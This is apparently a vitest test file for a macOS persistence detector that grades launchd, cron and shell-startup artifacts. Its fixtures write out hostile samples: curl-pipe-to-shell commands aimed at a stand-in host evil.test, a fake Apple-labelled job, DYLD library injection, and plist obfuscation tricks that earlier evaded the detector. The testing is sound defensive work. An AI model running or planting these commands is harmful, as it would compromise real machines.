import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { gradeLaunchd, misleadingLabel, judgeJob, runsAs } from "../../src/analysis/macosPersistRules.js";
import { readLaunchJob, launchScope } from "../../src/analysis/macosPersistence.js";
import { parseMacPersist, readMacCollection } from "../../src/analysis/macosPersistImport.js";
import { detectImportKind } from "../../src/analysis/importDetect.js";
import type { CollectedFile } from "../../src/analysis/linuxPersistence.js";

const plist = (entries: Record<string, string>) =>
  `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
${Object.entries(entries)
  .map(([k, v]) => `<key>${k}</key>${v}`)
  .join("\n")}
</dict></plist>`;

const prog = (...args: string[]) => `<array>${args.map((a) => `<string>${a}</string>`).join("")}</array>`;

const file = (path: string, content: string, over: Partial<CollectedFile> = {}): CollectedFile => ({
  path,
  kind: "launchd",
  content,
  ...over,
});

const job = (
  entries: Record<string, string>,
  path = "/Library/LaunchDaemons/x.plist",
  over: Partial<CollectedFile> = {},
) => gradeLaunchd(file(path, plist(entries), over), {});

describe("the # quarantine: header (#933 item 7)", () => {
  const susp = {
    Label: "<string>com.vendor.helper</string>",
    ProgramArguments: prog("/Users/Shared/.a/agent"),
  };
  it("a raw xattr value is decoded by its documented form: flags, Unix hex time, agent, event id", () => {
    const [s] = job(susp, "/Library/LaunchDaemons/x.plist", {
      extra: { quarantine: "0083;5f3a1b2c;Safari;550E8400-E29B-41D4-A716-446655440000" },
    });
    expect(s.reason).toContain(
      "[quarantine mark: download, sandbox (+0x0080); agent Safari; marked 2020-08-17T05:52:44.000Z (Unix hex); event 550e8400-e29b-41d4-a716-446655440000]",
    );
    expect(s.reason).not.toContain("downloaded from");
    expect(s.severity).toBe("High");
  });
  it("the legacy URL form keeps its words", () => {
    const [s] = job(susp, "/Library/LaunchDaemons/x.plist", {
      extra: { quarantine: "https://evil.test/update.zip" },
    });
    expect(s.reason).toContain("it was downloaded from https://evil.test/update.zip");
  });
  it("a value that is neither a mark nor a URL is said to be undecodable, never a download URL", () => {
    const [s] = job(susp, "/Library/LaunchDaemons/x.plist", {
      extra: { quarantine: "0083;zz;Safari;550E8400-E29B-41D4-A716-446655440000" },
    });
    expect(s.reason).toContain(
      "[quarantine mark (not decodable): 0083;zz;Safari;550E8400-E29B-41D4-A716-446655440000]",
    );
    expect(s.reason).not.toContain("downloaded from");
  });
  it("an agent that spells a tag or a hash is neutralised", () => {
    const [s] = job(susp, "/Library/LaunchDaemons/x.plist", {
      extra: { quarantine: `0001;5f3a1b2c;${"a".repeat(32)}] [x;550E8400-E29B-41D4-A716-446655440000` },
    });
    expect(s.reason).not.toMatch(/[0-9a-f]{32}/);
    expect(s.reason).not.toContain("] [x");
  });
});

describe("what a launchd finding needs", () => {
  it("reports a program in a directory anything can write", () => {
    const [s] = job({
      Label: "<string>com.vendor.helper</string>",
      ProgramArguments: prog("/Users/Shared/.a/agent"),
    });
    expect(s.severity).toBe("High");
    expect(s.mitre).toContain("T1543.004");
    expect(s.reason).toContain("any process can write");
    expect(s.reason).toContain("root at boot");
  });

  it("reports a command that downloads and executes", () => {
    const [s] = job({
      Label: "<string>com.vendor.updater</string>",
      ProgramArguments: prog("/bin/sh", "-c", "curl -fsSL http://evil.test/a | sh"),
    });
    expect(s.severity).toBe("High");
    expect(s.mitre).toContain("T1105");
  });

  // The label claims Apple; Apple does not install anywhere but /System/Library.
  it("reports a misleading Apple label", () => {
    const [s] = job({
      Label: "<string>com.apple.softwareupdated</string>",
      ProgramArguments: prog("/usr/local/bin/su"),
    });
    expect(s.severity).toBe("High");
    expect(s.mitre).toContain("T1036.005");
    expect(s.reason).toContain("claims to be Apple");
  });

  it("does not call Apple's own job misleading", () => {
    const real = readLaunchJob({
      Label: "com.apple.softwareupdated",
      Program: "/usr/libexec/softwareupdated",
    });
    expect(
      misleadingLabel(real, launchScope("/System/Library/LaunchDaemons/com.apple.softwareupdated.plist")),
    ).toBe(false);
    expect(misleadingLabel(real, "system-daemon")).toBe(false);
  });

  it("does not call an honest third-party label misleading", () => {
    const j = readLaunchJob({
      Label: "com.docker.helper",
      Program: "/Applications/Docker.app/Contents/MacOS/x",
    });
    expect(misleadingLabel(j, "system-daemon")).toBe(false);
  });

  // Almost every Mac application installs one of these.
  it("says nothing about an ordinary LaunchAgent", () => {
    expect(
      job(
        {
          Label: "<string>com.google.keystone.agent</string>",
          ProgramArguments: prog(
            "/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/MacOS/x",
          ),
          RunAtLoad: "<true/>",
          KeepAlive: "<true/>",
        },
        "/Library/LaunchAgents/com.google.keystone.agent.plist",
      ),
    ).toEqual([]);
  });

  // Disabled is only the plist's DEFAULT — `launchctl load -w` overrides it and the job runs.
  // Dropping the job on this key was a one-line evasion.
  it("still reports a disabled job, at a lower severity, and says the key can be overridden", () => {
    const [s] = job({
      Label: "<string>com.x</string>",
      ProgramArguments: prog("/tmp/agent"),
      Disabled: "<true/>",
    });
    expect(s.severity).toBe("Medium");
    expect(s.reason).toContain("launchctl load -w");
  });

  // Almost every real macOS persistence job drives an Apple-shipped interpreter or transfer tool.
  it("reports an Apple-claiming label that runs an Apple-shipped tool", () => {
    const [s] = job(
      {
        Label: "<string>com.apple.updated</string>",
        ProgramArguments: prog("/usr/bin/curl", "http://evil.test/x"),
      },
      "/Library/LaunchAgents/com.apple.updated.plist",
    );
    expect(s.severity).toBe("High");
    expect(s.mitre).toContain("T1036.005");
  });

  it("reads a payload out of EnvironmentVariables", () => {
    const [s] = job({
      Label: "<string>com.corp.helper</string>",
      ProgramArguments: prog("/usr/local/bin/helper"),
      EnvironmentVariables:
        "<dict><key>DYLD_INSERT_LIBRARIES</key><string>/tmp/.x/evil.dylib</string></dict>",
    });
    expect(s.severity).toBe("High");
  });

  // A plist that yields no program must SAY it could not be read.
  it("says an unreadable plist was not assessed, rather than saying nothing", () => {
    const [s] = gradeLaunchd(file("/Library/LaunchDaemons/x.plist", "<plist><dict></dict></plist>"), {});
    expect(s.severity).toBe("Medium");
    expect(s.reason).toContain("Nothing about it has been assessed either way");

    const [t] = gradeLaunchd(file("/Library/LaunchDaemons/y.plist", "not a plist at all"), {});
    expect(t.reason).toContain("could not be parsed");
  });

  // Each of these was a one-line evasion that made a malicious job read as clean.
  it("reads a program hidden behind CDATA, numeric entities, a comment or a quoted attribute", () => {
    const cases = [
      "<key>Program</key><string><![CDATA[/tmp/evil.sh]]></string>",
      "<key>Program</key><string>&#47;tmp&#47;evil.sh</string>",
      "<key>Program</key><string>/tmp<!-- x -->/evil.sh</string>",
      '<key attr="a>b">Program</key><string>/tmp/evil.sh</string>',
      "<key>Orphan</key><key>Program</key><string>/tmp/evil.sh</string>",
    ];
    for (const body of cases) {
      const [s] = gradeLaunchd(
        file("/Library/LaunchDaemons/x.plist", plist({ __raw: "" }).replace("<key>__raw</key>", body)),
        {},
      );
      expect(s?.severity, body).toBe("High");
    }
  });

  it("honours a baseline of expected labels", () => {
    const f = file(
      "/Library/LaunchDaemons/x.plist",
      plist({ Label: "<string>com.corp.agent</string>", ProgramArguments: prog("/tmp/agent") }),
    );
    expect(gradeLaunchd(f, { knownLabels: ["com.corp.agent"] })).toEqual([]);
  });
});

describe("what only raises or explains, never fires alone", () => {
  // Homebrew, every internal build and much commercial software is unsigned or ad-hoc signed.
  it("says nothing about an unsigned program that is otherwise ordinary", () => {
    expect(
      job(
        { Label: "<string>com.corp.agent</string>", ProgramArguments: prog("/usr/local/bin/agent") },
        "/Library/LaunchDaemons/com.corp.agent.plist",
        { extra: { codesign: "unsigned" } },
      ),
    ).toEqual([]);
  });

  it("says nothing about a quarantine record on an otherwise ordinary job", () => {
    expect(
      job(
        { Label: "<string>com.corp.agent</string>", ProgramArguments: prog("/usr/local/bin/agent") },
        "/Library/LaunchDaemons/com.corp.agent.plist",
        { extra: { quarantine: "https://vendor.test/agent.pkg" } },
      ),
    ).toEqual([]);
  });

  it("says nothing about RunAtLoad and KeepAlive, which every real agent sets", () => {
    expect(
      job(
        {
          Label: "<string>com.corp.agent</string>",
          ProgramArguments: prog("/usr/local/bin/agent"),
          RunAtLoad: "<true/>",
          KeepAlive: "<true/>",
          StartInterval: "<integer>60</integer>",
        },
        "/Library/LaunchDaemons/com.corp.agent.plist",
      ),
    ).toEqual([]);
  });

  it("adds the quarantine record to a job that is already suspicious", () => {
    const [s] = job(
      { Label: "<string>com.corp.agent</string>", ProgramArguments: prog("/Users/Shared/agent") },
      "/Library/LaunchDaemons/x.plist",
      { extra: { quarantine: "https://evil.test/agent.zip" } },
    );
    expect(s.reason).toContain("downloaded from https://evil.test/agent.zip");
    expect(s.severity).toBe("High");
  });

  it("adds the signing status, and says when it was not collected", () => {
    const [unsigned] = job(
      { Label: "<string>x</string>", ProgramArguments: prog("/tmp/agent") },
      "/Library/LaunchDaemons/x.plist",
      {
        extra: { codesign: "unsigned" },
      },
    );
    expect(unsigned.reason).toContain("on its own that is ordinary on a Mac");
    const [none] = job({ Label: "<string>x</string>", ProgramArguments: prog("/tmp/agent") });
    expect(none.reason).toContain("did not record the program's signing status");
  });

  it("explains that the job restarts itself", () => {
    const [s] = job({
      Label: "<string>x</string>",
      ProgramArguments: prog("/tmp/agent"),
      RunAtLoad: "<true/>",
      KeepAlive: "<true/>",
    });
    expect(s.reason).toContain("stopping the process does not remove it");
  });
});

describe("binary plists", () => {
  it("says the file needs converting rather than reading nothing out of it", () => {
    const [s] = gradeLaunchd(file("/Library/LaunchDaemons/x.plist", "bplist00  "), {});
    expect(s.reason).toContain("plutil -convert xml1");
    expect(s.reason).toContain("Nothing about it has been assessed either way");
  });
});

describe("judgeJob and runsAs", () => {
  it("names who runs the job", () => {
    expect(runsAs(readLaunchJob({}), "system-daemon")).toBe("root at boot");
    expect(runsAs(readLaunchJob({}), "user-agent")).toBe("that user at login");
    expect(runsAs(readLaunchJob({ UserName: "www" }), "system-daemon")).toBe("www");
  });

  it("reads a transient path out of the arguments, not just the program", () => {
    const j = readLaunchJob({ ProgramArguments: ["/bin/sh", "/private/tmp/x.sh"] });
    expect(judgeJob(j, "system-daemon").transient).toBe(true);
  });
});

describe("the macOS collection", () => {
  const COLLECTION = [
    "==> /Library/LaunchDaemons/com.apple.updated.plist <==",
    "# mtime: 2026-01-02T09:00:00Z",
    "# codesign: unsigned",
    "# quarantine: https://evil.test/u.zip",
    plist({ Label: "<string>com.apple.updated</string>", ProgramArguments: prog("/Users/Shared/.u/agent") }),
    "==> /usr/lib/cron/tabs/alice <==",
    "*/5 * * * * /tmp/.x/run.sh",
    "==> /Users/alice/.zshrc <==",
    "curl -s http://evil.test/a | sh",
    "==> /var/log/system.log <==",
    "nothing",
  ].join("\n");

  it("reads launchd, cron and shell artifacts from one upload", () => {
    expect(readMacCollection("mac.txt", COLLECTION).map((f) => f.kind)).toEqual([
      "launchd",
      "cron",
      "shellrc",
      "unknown",
    ]);
  });

  it("grades all three, reusing the Linux rules for the shared ones", () => {
    const p = parseMacPersist("mac.txt", COLLECTION, {}, "2026-06-01T00:00:00Z");
    expect(new Set(p.signals.map((s) => s.kind))).toEqual(new Set(["launchd", "cron", "shellrc"]));
    expect(p.signals.every((s) => s.severity === "High")).toBe(true);
  });

  it("dates the plist event from its collected mtime and stamps the rest at the import time", () => {
    const p = parseMacPersist("mac.txt", COLLECTION, {}, "2026-06-01T00:00:00Z");
    const launchd = p.events.find((e) => e.path.endsWith("com.apple.updated.plist"));
    expect(launchd?.timestamp).toBe("2026-01-02T09:00:00.000Z");
    const rc = p.events.find((e) => e.path.endsWith(".zshrc"));
    expect(rc?.timestamp).toBe("2026-06-01T00:00:00Z");
    expect(rc?.description).toContain("no collected timestamp");
  });

  it("makes the payloads IOCs and names the source", () => {
    const p = parseMacPersist("mac.txt", COLLECTION, {}, "2026-06-01T00:00:00Z");
    expect(p.iocs.map((i) => i.value)).toContain("/Users/Shared/.u/agent");
    expect(p.events[0].sources).toEqual(["macOS persistence"]);
    expect(p.note).toContain("macOS persistence import");
    expect(p.note).toContain("1 member(s) skipped");
  });

  it("reads a single collected plist", () => {
    const p = parseMacPersist(
      "com.evil.agent.plist",
      plist({ Label: "<string>com.evil</string>", ProgramArguments: prog("/tmp/agent") }),
      {},
      "2026-06-01T00:00:00Z",
    );
    expect(p.signals).toHaveLength(1);
  });
});

describe("detection and dispatch", () => {
  it("routes a plist by its own content", () => {
    expect(detectImportKind("anything.txt", plist({ Label: "<string>x</string>" }))).toBe("macospersist");
    expect(detectImportKind("com.x.plist", "<plist><dict/></plist>")).toBe("macospersist");
  });

  it("routes a collection that holds a launchd member", () => {
    expect(
      detectImportKind(
        "mac.txt",
        ["==> /Library/LaunchAgents/x.plist <==", "<plist><dict/></plist>"].join("\n"),
      ),
    ).toBe("macospersist");
  });

  it("leaves a collection with no launchd member to the Linux importer", () => {
    expect(detectImportKind("linux.txt", ["==> /etc/crontab <==", "* * * * * root x"].join("\n"))).toBe(
      "linuxpersist",
    );
  });

  it("reaches a dispatch case and a pipeline method", () => {
    const dispatch = readFileSync(join(process.cwd(), "src/composition/importIngest.ts"), "utf8");
    expect(dispatch).toContain('case "macospersist":');
    const pipeline = readFileSync(join(process.cwd(), "src/analysis/pipeline.ts"), "utf8");
    expect(pipeline).toContain("importMacosPersist");
  });
});
